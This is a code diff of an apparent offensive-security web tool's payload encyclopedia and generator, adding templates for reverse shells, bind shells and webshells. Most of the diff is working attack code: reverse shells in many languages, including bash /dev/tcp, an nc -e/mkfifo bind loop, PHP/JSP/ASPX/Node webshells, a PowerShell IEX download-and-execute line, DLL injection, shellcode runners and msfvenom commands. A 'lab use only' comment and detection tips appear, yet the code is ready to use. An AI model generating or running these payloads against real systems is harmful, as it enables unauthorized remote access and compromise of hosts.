+    cons: ['Container may have limited tools', 'Often runs with minimal privileges', 'Container logs may capture activity'],
+    icon: <Cpu size={18} />,
+    color: 'text-sky-400',
+    defaultPort: 4444,
+    requiresLhost: true,
+    requiresLport: true,
+    supportedFormats: ['bash', 'python', 'go'],
+    howItWorks: 'Uses bash /dev/tcp or Python socket to connect back from within the container.',
+    exampleScenario: 'Compromise a container via a vulnerable application, then establish a reverse shell.',
+    commonListenerCommand: 'nc -lvnp ${lport}',
+    detectionIndicators: [
+      'Unusual outbound connections from containers',
+      'Container logs showing shell activity',
+      'Suspicious container processes',
+    ],
+    mitigationTips: [
+      'Run containers with minimal privileges',
+      'Use container security scanning',
+      'Monitor container logs for anomalies',
+    ],
+    references: ['https://attack.mitre.org/techniques/T1071/', 'https://docs.docker.com/security/'],
+    isComplete: false,
+    labVsReal: 'Docker reverse shells are common in labs and increasingly used in real engagements targeting containerized environments.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Medium',
+    reliabilityRating: 'High',
+  },
+  // 42. Kubernetes Exec Shell
+  {
+    type: 'kubernetes_exec',
+    name: 'Kubernetes Exec Shell',
+    category: 'Cloud / Container',
+    description: 'Executes a shell in a Kubernetes pod — container orchestration access.',
+    whatItDoes: 'Uses kubectl exec to get a shell in a pod, or creates a privileged pod.',
+    howToUse: 'Requires kubectl access or compromised service account.',
+    whereToUse: 'Kubernetes pentesting, cloud-native assessments.',
+    pros: ['Native Kubernetes access', 'Can access cluster resources', 'Powerful for pivoting'],
+    cons: ['Requires Kubernetes access', 'Heavily logged in audit logs', 'May be monitored by security tools'],
+    icon: <Network size={18} />,
+    color: 'text-blue-500',
+    defaultPort: 0,
+    requiresLhost: false,
+    requiresLport: false,
+    supportedFormats: ['bash', 'python', 'go'],
+    howItWorks: 'Uses kubectl exec to run a shell in a pod, or creates a privileged pod for cluster access.',
+    exampleScenario: 'Compromise a service account with kubectl access, then exec into pods to gather credentials.',
+    commonListenerCommand: 'kubectl exec -it pod-name -- /bin/bash',
+    detectionIndicators: [
+      'Kubernetes API calls to exec endpoints',
+      'Privileged pod creation',
+      'Unusual service account activity',
+    ],
+    mitigationTips: [
+      'Use RBAC to limit kubectl exec access',
+      'Enable Kubernetes audit logging',
+      'Use Pod Security Policies/Standards',
+    ],
+    references: ['https://attack.mitre.org/techniques/T1059/', 'https://kubernetes.io/docs/concepts/security/'],
+    isComplete: false,
+    labVsReal: 'Kubernetes exec shells are a key technique in cloud-native red team engagements targeting container orchestration platforms.',
+    detectionComplexity: 'High',
+    stealthRating: 'Medium',
+    reliabilityRating: 'High',
+  },
+  // 43. Python WebSocket Shell
+  {
+    type: 'python_websocket_shell',
+    name: 'Python WebSocket Shell',
+    category: 'Reverse Shells',
+    description: 'Reverse shell over WebSockets — modern, browser-friendly C2.',
+    whatItDoes: 'Uses WebSockets for bidirectional communication, works through firewalls.',
+    howToUse: 'Set up a WebSocket server, generate payload, run on target.',
+    whereToUse: 'When you need a modern, browser-compatible C2 channel.',
+    pros: ['Works through firewalls', 'Browser-compatible', 'Supports binary data'],
+    cons: ['Requires WebSocket library', 'Less common than HTTP(S)', 'May be detected by some proxies'],
+    icon: <Wifi size={18} />,
+    color: 'text-green-400',
+    defaultPort: 8080,
+    requiresLhost: true,
+    requiresLport: true,
+    supportedFormats: ['python', 'javascript'],
+    howItWorks: 'Uses WebSockets (WS or WSS) for command and control, with subprocess for command execution.',
+    exampleScenario: 'Establish a WebSocket-based C2 channel from a compromised server to evade traditional detection.',
+    commonListenerCommand: 'python websocket_server.py --port ${lport}',
+    detectionIndicators: [
+      'Unusual WebSocket connections from processes',
+      'Long-lived WebSocket sessions to external servers',
+      'WebSocket payloads with command execution patterns',
+    ],
+    mitigationTips: [
+      'Monitor WebSocket traffic for anomalies',
+      'Use web proxies with WebSocket inspection',
+      'Block external WebSocket connections where possible',
+    ],
+    references: ['https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API', 'https://attack.mitre.org/techniques/T1071/'],
+    isComplete: false,
+    labVsReal: 'WebSocket shells are increasingly common in modern labs and real engagements due to their ability to blend in with legitimate web traffic.',
+    detectionComplexity: 'High',
+    stealthRating: 'High',
+    reliabilityRating: 'High',
+  },
+  // 44. Rust Reverse Shell
+  {
+    type: 'rust_reverse',
+    name: 'Rust Reverse Shell',
+    category: 'Reverse Shells',
+    description: 'Reverse shell written in Rust — modern, memory-safe, and cross-platform.',
+    whatItDoes: 'Opens a reverse shell using Rust\'s standard library, compiled to a native executable.',
+    howToUse: 'Compile the Rust code, execute on target. Works on Windows, macOS, Linux.',
+    whereToUse: 'When you need a small, cross-platform executable with minimal dependencies.',
+    pros: ['Cross-platform (Windows/macOS/Linux)', 'Memory-safe', 'Small executable size', 'No external dependencies'],
+    cons: ['Requires Rust compiler to build', 'Less common than other languages', 'May be flagged by some AV'],
+    icon: <Braces size={18} />,
+    color: 'text-orange-400',
+    defaultPort: 4444,
+    requiresLhost: true,
+    requiresLport: true,
+    supportedFormats: ['rust'],
+    howItWorks: 'Uses Rust\'s std::net and std::process to establish a TCP connection and spawn a shell.',
+    exampleScenario: 'Deploy a Rust reverse shell to a cross-platform environment where you need a reliable, lightweight payload.',
+    commonListenerCommand: 'nc -lvnp ${lport}',
+    detectionIndicators: [
+      'Unusual Rust-compiled executables',
+      'Processes with Rust-specific memory patterns',
+      'Network connections from unusual executables',
+    ],
+    mitigationTips: [
+      'Monitor for unknown executables',
+      'Use EDR with behavioral detection',
+      'Restrict outbound connections from endpoints',
+    ],
+    references: ['https://www.rust-lang.org/', 'https://attack.mitre.org/techniques/T1059/'],
+    isComplete: false,
+    labVsReal: 'Rust reverse shells are gaining popularity in both labs and real engagements due to Rust\'s cross-platform capabilities and memory safety.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Medium',
+    reliabilityRating: 'High',
+  },
+];
 
 // ─── Build lookup map ─────────────────────────────────────
 const PAYLOAD_BY_TYPE: Record<PayloadType, PayloadInfo> = PAYLOAD_ENCYCLOPEDIA.reduce(
-  (acc, p) => ({ ...acc, [p.type]: p }), 
+  (acc, p) => ({ ...acc, [p.type]: p }),
   {} as Record<PayloadType, PayloadInfo>
-)
+);
 
 // ─── Generator ─────────────────────────────────────────────
+function buildMsfvenomCommand(
+  type: PayloadType,
+  format: OutputFormat,
+  lhost: string,
+  lport: number
+): string | null {
+  const map: Partial<Record<PayloadType, { payload: string; outExt: string }>> = {
+    reverse_shell: { payload: 'linux/x64/shell_reverse_tcp', outExt: 'elf' },
+    meterpreter: { payload: 'windows/x64/meterpreter/reverse_tcp', outExt: 'exe' },
+    bind_shell: { payload: 'linux/x64/shell_bind_tcp', outExt: 'elf' },
+    reverse_https: { payload: 'windows/x64/meterpreter/reverse_https', outExt: 'exe' },
+    reverse_http: { payload: 'windows/x64/meterpreter/reverse_http', outExt: 'exe' },
+    powershell_encoded: { payload: 'windows/x64/meterpreter/reverse_tcp', outExt: 'ps1' },
+    shellcode: { payload: 'windows/x64/meterpreter/reverse_tcp', outExt: 'bin' },
+  };
+  const entry = map[type];
+  if (!entry) return null;
+
+  let msfFormat = 'raw';
+  if (format === 'powershell') msfFormat = 'psh';
+  else if (format === 'csharp') msfFormat = 'csharp';
+  else if (format === 'python') msfFormat = 'python';
+  else if (format === 'raw_c') msfFormat = 'c';
+  else if (format === 'bash') msfFormat = 'raw';
+  else if (type === 'shellcode') msfFormat = 'raw';
+  else if (type === 'meterpreter') msfFormat = 'exe';
+
+  const lhostFlag = type === 'bind_shell' ? '' : ` LHOST=${lhost}`;
+  return `msfvenom -p ${entry.payload}${lhostFlag} LPORT=${lport} -f ${msfFormat} -o ${type}.${entry.outExt}`;
+}
+
+interface HistoryEntry {
+  id: string;
+  at: number;
+  type: PayloadType;
+  format: OutputFormat;
+  lhost: string;
+  lport: number;
+  snippet: string;
+}
+
 function generatePayloadCode(
   type: PayloadType,
   format: OutputFormat,
@@ -1560,23 +2031,34 @@ function generatePayloadCode(
 ): string {
   const base = `// ${type.toUpperCase()} Payload - ${format} - ${obfuscation} obfuscation
 // LHOST: ${lhost} | LPORT: ${lport}
+// ⚠️ LAB / AUTHORIZED USE ONLY — unauthorized use is illegal
 
-`
+`;
 
-  let rawCode = ''
+  let rawCode = '';
 
   switch (type) {
     case 'reverse_shell': {
       switch (format) {
         case 'python':
-          rawCode = base + `import socket, subprocess, os
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("${lhost}", ${lport}))
-os.dup2(s.fileno(), 0)
-os.dup2(s.fileno(), 1)
-os.dup2(s.fileno(), 2)
-subprocess.call(["/bin/sh", "-i"])`
-          break
+          rawCode = base + `import socket, subprocess, os, sys
+
+def reverse_shell():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(("${lhost}", ${lport}))
+        # Redirect stdin, stdout, stderr to the socket
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        # Spawn a shell
+        subprocess.call(["/bin/sh", "-i"])
+    except Exception as e:
+        sys.exit(1)
+
+if __name__ == "__main__":
+    reverse_shell()`;
+          break;
         case 'powershell':
           rawCode = base + `$client = New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});
 $stream = $client.GetStream();
@@ -1589,23 +2071,35 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
     $stream.Write($sendbyte,0,$sendbyte.Length);
     $stream.Flush()
 };
-$client.Close()`
-          break
+$client.Close()`;
+          break;
         case 'go':
           rawCode = base + `package main
-import ("net";"os/exec")
+
+import (
+    "net"
+    "os/exec"
+)
+
 func main() {
-    c, _ := net.Dial("tcp", "${lhost}:${lport}")
+    conn, err := net.Dial("tcp", "${lhost}:${lport}")
+    if err != nil {
+        return
+    }
     cmd := exec.Command("/bin/sh")
-    cmd.Stdin = c; cmd.Stdout = c; cmd.Stderr = c
+    cmd.Stdin = conn
+    cmd.Stdout = conn
+    cmd.Stderr = conn
     cmd.Run()
-}`
-          break
+}`;
+          break;
         case 'raw_c':
           rawCode = base + `#include <stdio.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <unistd.h>
+
 int main() {
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     struct sockaddr_in sin = {0};
@@ -1613,41 +2107,62 @@ int main() {
     sin.sin_port = htons(${lport});
     sin.sin_addr.s_addr = inet_addr("${lhost}");
     connect(sock, (struct sockaddr*)&sin, sizeof(sin));
-    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
+    dup2(sock, 0);
+    dup2(sock, 1);
+    dup2(sock, 2);
     execve("/bin/sh", NULL, NULL);
-}`
-          break
+    return 0;
+}`;
+          break;
         case 'csharp':
           rawCode = base + `using System;
 using System.Net.Sockets;
 using System.Diagnostics;
+using System.IO;
+
 class Program {
     static void Main() {
-        TcpClient client = new TcpClient("${lhost}", ${lport});
-        Process p = new Process();
-        p.StartInfo.FileName = "cmd.exe";
-        p.StartInfo.UseShellExecute = false;
-        p.StartInfo.RedirectStandardInput = true;
-        p.StartInfo.RedirectStandardOutput = true;
-        p.StartInfo.RedirectStandardError = true;
-        p.Start();
-        p.StandardInput.WriteLine("whoami");
-        p.StandardInput.Flush();
+        using (var client = new TcpClient("${lhost}", ${lport}))
+        using (var stream = client.GetStream())
+        using (var reader = new StreamReader(stream))
+        using (var writer = new StreamWriter(stream) { AutoFlush = true }) {
+            while (true) {
+                writer.Write("cmd> ");
+                var line = reader.ReadLine();
+                if (string.IsNullOrEmpty(line) || line == "exit") break;
+                var p = new Process {
+                    StartInfo = new ProcessStartInfo("cmd.exe", "/c " + line) {
+                        RedirectStandardOutput = true,
+                        RedirectStandardError = true,
+                        UseShellExecute = false,
+                        CreateNoWindow = true
+                    }
+                };
+                p.Start();
+                writer.Write(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
+            }
+        }
     }
-}`
-          break
+}`;
+          break;
         case 'bash':
           rawCode = base + `#!/bin/bash
-bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`
-          break
+# Classic bash reverse shell using /dev/tcp
+bash -i >& /dev/tcp/${lhost}/${lport} 0>&1
+
+# Fallback: Python if /dev/tcp unavailable
+# python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
+          break;
         case 'perl':
           rawCode = base + `#!/usr/bin/perl
 use Socket;
 socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
 connect(S, sockaddr_in(${lport}, inet_aton("${lhost}")));
-open(STDIN, ">&S"); open(STDOUT, ">&S"); open(STDERR, ">&S");
-exec("/bin/sh -i");`
-          break
+open(STDIN, ">&S");
+open(STDOUT, ">&S");
+open(STDERR, ">&S");
+exec("/bin/sh -i");`;
+          break;
         case 'ruby':
           rawCode = base + `#!/usr/bin/env ruby
 require 'socket'
@@ -1655,356 +2170,705 @@ s = TCPSocket.new("${lhost}", ${lport})
 loop do
     cmd = s.gets
     IO.popen(cmd, "r") { |io| s.print io.read }
-end`
-          break
+end`;
+          break;
+        case 'rust':
+          rawCode = base + `use std::net::TcpStream;
+use std::os::unix::io::AsRawFd;
+use std::process::{Command, Stdio};
+
+fn main() {
+    if let Ok(stream) = TcpStream::connect("${lhost}:${lport}") {
+        let fd = stream.as_raw_fd();
+        Command::new("/bin/sh")
+            .stdin(Stdio::from_raw_fd(fd))
+            .stdout(Stdio::from_raw_fd(fd))
+            .stderr(Stdio::from_raw_fd(fd))
+            .status()
+            .ok();
+    }
+}`;
+          break;
         default:
-          rawCode = base + `// ${type} payload in ${format} format not yet implemented`
+          rawCode = base + `// ${type} payload in ${format} format not yet implemented`;
       }
-      break
+      break;
     }
     case 'meterpreter': {
       switch (format) {
         case 'csharp':
           rawCode = base + `// Meterpreter C# (Reflective DLL)
-// Use with Metasploit handler
-// Compile with: csc /target:library /out:payload.dll payload.cs`
-          break
+// Compile with: csc /target:library /out:payload.dll payload.cs
+// Use with: msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ${lhost}; set LPORT ${lport}; exploit"
+
+using System;
+using System.Runtime.InteropServices;
+
+namespace Meterpreter {
+    public class Payload {
+        [DllImport("kernel32.dll")]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+        [DllImport("kernel32.dll")]
+        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+        public static void Run() {
+            // Placeholder: replace with actual Meterpreter shellcode
+            byte[] shellcode = new byte[] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc };
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
+            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+        }
+    }
+}`;
+          break;
         case 'python':
-          rawCode = base + `# Meterpreter Python (using pymsf or custom)
-# This is a placeholder; real Meterpreter is not available in Python.
-# Use Metasploit's python meterpreter via msfvenom.`
-          break
+          rawCode = base + `# Meterpreter Python (using pymsf)
+# This is a placeholder. Real Meterpreter is not available in pure Python.
+# Use msfvenom to generate Meterpreter in other formats.
+# Example: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f python -v shellcode
+
+print("Meterpreter not available in Python. Use msfvenom for actual payload.")
+# shellcode = b""  # Paste msfvenom output here`;
+          break;
         case 'powershell':
           rawCode = base + `# Meterpreter PowerShell via Invoke-Metasploit
 # Download and execute meterpreter payload from a remote server.
-IEX (New-Object Net.WebClient).DownloadString('http://${lhost}/payload.ps1')`
-          break
+# This is a placeholder — use msfvenom to generate actual PowerShell payload.
+
+$url = "http://${lhost}:${lport}/payload.ps1"
+IEX (New-Object Net.WebClient).DownloadString($url)`;
+          break;
         default:
-          rawCode = base + `// Meterpreter not implemented for ${format}`
+          rawCode = base + `// Meterpreter not implemented for ${format}`;
       }
-      break
+      break;
     }
     case 'bind_shell': {
       switch (format) {
         case 'powershell':
-          rawCode = base + `$listener = New-Object System.Net.Sockets.TcpListener(${lport});
+          rawCode = base + `$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', ${lport});
 $listener.Start();
 $client = $listener.AcceptTcpClient();
 $stream = $client.GetStream();
-# ... similar to reverse shell but accepting connection`
-          break
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+  $sendback = (iex $data 2>&1 | Out-String);
+  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+  $stream.Write($sendbyte,0,$sendbyte.Length);
+  $stream.Flush()
+}
+$client.Close(); $listener.Stop()`;
+          break;
         case 'csharp':
-          rawCode = base + `// Bind shell C#
-TcpListener listener = new TcpListener(IPAddress.Any, ${lport});
-listener.Start();
-TcpClient client = listener.AcceptTcpClient();
-// ... process commands`
-          break
+          rawCode = base + `using System;
+using System.Net;
+using System.Net.Sockets;
+using System.Diagnostics;
+using System.IO;
+
+class BindShell {
+    static void Main() {
+        var listener = new TcpListener(IPAddress.Any, ${lport});
+        listener.Start();
+        using (var client = listener.AcceptTcpClient())
+        using (var stream = client.GetStream())
+        using (var reader = new StreamReader(stream))
+        using (var writer = new StreamWriter(stream) { AutoFlush = true }) {
+            while (true) {
+                writer.Write("cmd> ");
+                var line = reader.ReadLine();
+                if (string.IsNullOrEmpty(line) || line == "exit") break;
+                var p = new Process {
+                    StartInfo = new ProcessStartInfo("cmd.exe", "/c " + line) {
+                        RedirectStandardOutput = true,
+                        RedirectStandardError = true,
+                        UseShellExecute = false,
+                        CreateNoWindow = true
+                    }
+                };
+                p.Start();
+                writer.Write(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
+            }
+        }
+        listener.Stop();
+    }
+}`;
+          break;
         case 'raw_c':
-          rawCode = base + `// Bind shell C
-int server = socket(...);
-bind(...);
-listen(...);
-int client = accept(...);
-dup2(client, 0); dup2(client, 1); dup2(client, 2);
-execve("/bin/sh", NULL, NULL);`
-          break
+          rawCode = base + `#include <stdio.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+int main() {
+    int s = socket(AF_INET, SOCK_STREAM, 0);
+    int opt = 1;
+    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+    struct sockaddr_in a = {0};
+    a.sin_family = AF_INET;
+    a.sin_port = htons(${lport});
+    a.sin_addr.s_addr = INADDR_ANY;
+    bind(s, (struct sockaddr*)&a, sizeof(a));
+    listen(s, 1);
+    int c = accept(s, NULL, NULL);
+    dup2(c, 0);
+    dup2(c, 1);
+    dup2(c, 2);
+    execve("/bin/sh", (char *[]){"/bin/sh", NULL}, NULL);
+    return 0;
+}`;
+          break;
         case 'python':
           rawCode = base + `import socket, subprocess, os
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.bind(('0.0.0.0', ${lport}))
 s.listen(1)
 conn, addr = s.accept()
 os.dup2(conn.fileno(), 0)
 os.dup2(conn.fileno(), 1)
 os.dup2(conn.fileno(), 2)
-subprocess.call(["/bin/sh", "-i"])`
-          break
+subprocess.call(["/bin/sh", "-i"])`;
+          break;
+        case 'bash':
+          rawCode = base + `#!/bin/bash
+# Bind shell — connect with: nc <target-ip> ${lport}
+while true; do
+    nc -lp ${lport} -e /bin/bash 2>/dev/null || \\
+    nc -lp ${lport} -c /bin/bash 2>/dev/null || \\
+    { rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lp ${lport} > /tmp/f; }
+done`;
+          break;
         default:
-          rawCode = base + `// Bind shell not implemented for ${format}`
+          rawCode = base + `// Bind shell not implemented for ${format}`;
       }
-      break
+      break;
     }
     case 'webshell': {
       switch (format) {
         case 'php':
           rawCode = base + `<?php
-if (isset($_GET['cmd'])) { echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; }
-?>`
-          break
+// PHP WebShell — ⚠️ LAB USE ONLY
+if (isset($_GET['cmd'])) {
+    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+}
+?>
+
+
+You can also use: curl -X GET "http://target/webshell.php?cmd=id"`;
+          break;
         case 'javascript':
-          rawCode = base + `// Node.js webshell
+          rawCode = base + `// Node.js WebShell
 const http = require('http');
 const { exec } = require('child_process');
+
 http.createServer((req, res) => {
     const url = new URL(req.url, 'http://localhost');
     const cmd = url.searchParams.get('cmd');
     if (cmd) {
-        exec(cmd, (err, stdout) => res.end(stdout));
-    } else res.end('WebShell ready');
-}).listen(${lport});`
-          break
+        exec(cmd, (err, stdout) => {
+            res.end(stdout || err?.message || '');
+        });
+    } else {
+        res.end('WebShell ready');
+    }
+}).listen(${lport});
+
+console.log(\`WebShell listening on port ${lport}\`);`;
+          break;
         case 'python':
           rawCode = base + `#!/usr/bin/env python3
-import http.server, subprocess, urllib.parse
-class Handler(http.server.SimpleHTTPRequestHandler):
+import http.server
+import subprocess
+import urllib.parse
+
+class WebShellHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
         query = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
         cmd = query.get('cmd', [''])[0]
         if cmd:
-            result = subprocess.check_output(cmd, shell=True)
-            self.send_response(200); self.end_headers(); self.wfile.write(result)
+            try:
+                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(result)
+            except Exception as e:
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(str(e).encode())
         else:
-            self.send_response(200); self.end_headers(); self.wfile.write(b'WebShell ready')
-http.server.HTTPServer(('0.0.0.0', ${lport}), Handler).serve_forever()`
-          break
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b'WebShell ready')
+
+if __name__ == "__main__":
+    http.server.HTTPServer(('0.0.0.0', ${lport}), WebShellHandler).serve_forever()`;
+          break;
         case 'jsp':
           rawCode = base + `<%@ page import="java.io.*" %>
+<%!
+    String execCmd(String cmd) throws Exception {
+        Process p = Runtime.getRuntime().exec(cmd);
+        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+        StringBuilder out = new StringBuilder();
+        String line;
+        while ((line = reader.readLine()) != null) out.append(line).append("\\n");
+        return out.toString();
+    }
+%>
 <%
-String cmd = request.getParameter("cmd");
-if (cmd != null) {
-    Process p = Runtime.getRuntime().exec(cmd);
-    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
-    String line;
-    while ((line = reader.readLine()) != null) out.println(line);
-}
-%>`
-          break
+    String cmd = request.getParameter("cmd");
+    if (cmd != null && !cmd.isEmpty()) {
+        out.println("<pre>" + execCmd(cmd) + "</pre>");
+    } else {
+        out.println("JSP WebShell ready");
+    }
+%>`;
+          break;
         case 'aspx':
           rawCode = base + `<%@ Page Language="C#" %>
 <script runat="server">
-protected void Page_Load(object sender, EventArgs e) {
-    string cmd = Request["cmd"];
-    if (cmd != null) {
-        System.Diagnostics.Process p = new System.Diagnostics.Process();
-        p.StartInfo.FileName = "cmd.exe";
-        p.StartInfo.Arguments = "/c " + cmd;
-        p.StartInfo.RedirectStandardOutput = true;
-        p.StartInfo.UseShellExecute = false;
-        p.Start();
-        Response.Write(p.StandardOutput.ReadToEnd());
+    protected void Page_Load(object sender, EventArgs e) {
+        string cmd = Request["cmd"];
+        if (!string.IsNullOrEmpty(cmd)) {
+            System.Diagnostics.Process p = new System.Diagnostics.Process();
+            p.StartInfo.FileName = "cmd.exe";
+            p.StartInfo.Arguments = "/c " + cmd;
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.UseShellExecute = false;
+            p.Start();
+            Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
+        } else {
+            Response.Write("ASPX WebShell ready");
+        }
     }
-}
-</script>`
-          break
+</script>`;
+          break;
         default:
-          rawCode = base + `// Webshell not implemented for ${format}`
+          rawCode = base + `// WebShell not implemented for ${format}`;
       }
-      break
+      break;
     }
     case 'dll_inject': {
       if (format === 'csharp') {
         rawCode = base + `using System;
 using System.Runtime.InteropServices;
-class Program {
+
+class DllInjector {
     [DllImport("kernel32.dll")]
-    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
     [DllImport("kernel32.dll")]
     static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
     [DllImport("kernel32.dll")]
     static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-    // ... full implementation
-}`
+
+    static void Main() {
+        int pid = 0; // Set target PID
+        string dllPath = @"C:\\path\\to\\payload.dll";
+        IntPtr hProcess = OpenProcess(0x1F0FFF, false, pid);
+        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllPath.Length + 1, 0x3000, 0x40);
+        byte[] bytes = System.Text.Encoding.ASCII.GetBytes(dllPath);
+        WriteProcessMemory(hProcess, addr, bytes, (uint)bytes.Length, out _);
+        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+    }
+}`;
       } else if (format === 'raw_c') {
         rawCode = base + `#include <windows.h>
 #include <stdio.h>
+
 int main() {
-    unsigned char shellcode[] = { /* ... */ };
+    unsigned char shellcode[] = {
+        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00
+        // ... actual shellcode bytes
+    };
     void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     memcpy(exec, shellcode, sizeof(shellcode));
     ((void(*)())exec)();
     return 0;
-}`
+}`;
       } else {
-        rawCode = base + `// DLL injection not implemented for ${format}`
+        rawCode = base + `// DLL injection not implemented for ${format}`;
       }
-      break
+      break;
     }
     case 'shellcode': {
       switch (format) {
         case 'raw_c':
-          rawCode = base + `unsigned char shellcode[] = {
+          rawCode = base + `// Shellcode in C — replace with actual shellcode bytes
+unsigned char shellcode[] = {
     0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00,
-    // ... actual shellcode bytes
+    0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
+    0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
+    0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
+    0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
+    0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
+    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
+    0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
+    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
+    0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49,
+    0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,
+    0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
+    0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0,
+    0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
+    0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
+    0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
+    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41,
+    0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
+    0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
+    0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff,
+    0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00,
